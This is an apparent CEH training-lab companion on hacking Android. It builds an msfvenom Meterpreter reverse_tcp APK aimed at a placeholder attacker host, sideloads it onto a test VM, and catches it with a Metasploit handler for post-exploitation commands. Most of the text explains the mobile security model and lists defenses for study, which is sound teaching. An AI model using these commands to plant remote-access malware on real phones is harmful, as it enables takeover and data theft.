Overview — what this lab is really teaching

The most valuable computer most people own is their phone. This lab builds a malicious Android app, installs it on a test device, and shows the remote control it grants — the mobile version of the system-hacking chain in Lab 21. It's Module 17: Hacking Mobile Platforms.

As with Lab 21, the point is understanding and defense, not operational attack. The thing to really grasp is the one setting this whole attack depends on: installing an app from outside the official store (sideloading). Nearly every mobile defense comes back to not doing that.

Isolated range only

You build and install the app on a test Android VM in the pod. Installing malware on a device you don't own, or without authorization, is illegal. Understand the chain to defend phones against it.

The environment you're working in

You run Metasploit on Kali and target an Android VM/emulator in the pod. The app is delivered and installed manually onto the test device — standing in for the social-engineering step that would trick a real user into sideloading it.

The attack chain, explained

Step 1 — Build the app

1 Generate an APK payload

root@kali:~# msfvenom -p android/meterpreter/reverse_tcp LHOST=KALI_IP LPORT=4444 -o app.apk

msfvenom packages an Android Meterpreter payload into an installable .apk. The anatomy is the same as the Windows case: -p the payload, LHOST/LPORT for the reverse connection, -o the output file. As in Lab 21, this companion shows the structural command for understanding and leaves out evasion tuning — and the honest point stands: Google Play Protect and mobile EDR flag these.

Step 2 — Deliver and install

2 Sideload onto the device

The app is copied to the Android VM and installed. On a real phone this requires the user to allow installation from unknown sources and tap through install prompts — two deliberate barriers Android puts in the way. Getting a user past them is the social-engineering step.

This is the choke point

No sideload, no attack. The official app stores scan for malware, so an attacker must convince the user to go around them. That's why "only install from the Play Store / App Store" is the headline mobile defense.

Step 3 — Catch and control

3 Handler, then post-exploitation

msf6 > use exploit/multi/handler
msf6 > set payload android/meterpreter/reverse_tcp
msf6 > set LHOST KALI_IP
msf6 > exploit -j -z

The handler waits for the app to call home. When the device runs it, a session opens and Android Meterpreter exposes the phone:

meterpreter > sysinfo
meterpreter > check_root
meterpreter > app_list
meterpreter > ls

sysinfo and check_root profile the device, app_list enumerates installed apps, and the file commands browse storage (e.g. cd /sdcard/download). Each is a documented post-exploitation command — and each has a matching defense below.

Reference — beyond the lab

The mobile attack surface

VectorNotes
Malicious apps (sideloaded)This lab — the dominant Android vector
Smishing / phishingSMS/links that lead to installs or credential theft
Rooting / jailbreakingRemoves OS protections; expands what malware can do
Insecure data storage / commsApp-level flaws (OWASP Mobile Top 10)
Public Wi-Fi / MiTMIntercepting unencrypted app traffic

Android vs. iOS security model (exam framing)

ConceptMeans
App sandboxingEach app isolated from others and the OS
Permission modelApps request access; users grant it (and should review it)
Code signingApps signed; stores vet them before distribution
SideloadingAndroid allows it (with warnings); iOS largely doesn't

Analysis tooling you'll hear about: MobSF (static/dynamic app analysis), Frida (runtime instrumentation), apktool (decompile APKs).

Where people get stuck

The defender's view

Almost every mobile defense traces back to one habit

Don't install apps from outside the official store, and keep the device current. The rest hardens what's left.

  • Official stores only — keep "unknown sources" off; the store's vetting and Play Protect catch the APKs this lab builds.
  • Keep the OS and apps updated — patches close the vulnerabilities malware relies on.
  • Review permissions — an app asking for far more than its purpose needs is a red flag; revoke what's unnecessary.
  • Don't root/jailbreak managed devices — it strips the OS protections that contain malware.
  • Enterprise: MDM + MTD — Mobile Device Management enforces policy; Mobile Threat Defense detects malicious apps and configurations.

CEH v13 exam relevance

The whole of Module 17: Hacking Mobile Platforms. High-yield facts:

  • Android vs. iOS security models: sandboxing, permissions, code signing, sideloading.
  • Sideloaded malicious apps as the primary Android vector, and rooting/jailbreaking risks.
  • The OWASP Mobile Top 10 app-level weaknesses.
  • Tooling: MobSF, Frida, apktool; msfvenom for Android payloads.
  • Enterprise defense: MDM and MTD, plus store-only installs and updates.

Check yourself

1. What single user action does this entire attack depend on?

Sideloading — installing the app from outside the official store, which requires enabling "unknown sources" and tapping through install prompts.

2. Why does the official app store function as a defense here?

Stores vet and scan apps (and Play Protect scans on-device), so a malicious APK like this one is detected or blocked before a user can run it.

3. How does rooting/jailbreaking change the risk?

It removes OS protections and sandboxing, giving malware far more access than it would have on a stock device.

4. Name two enterprise controls for mobile devices.

Mobile Device Management (MDM) and Mobile Threat Defense (MTD) — plus enforcing store-only installs and timely updates.
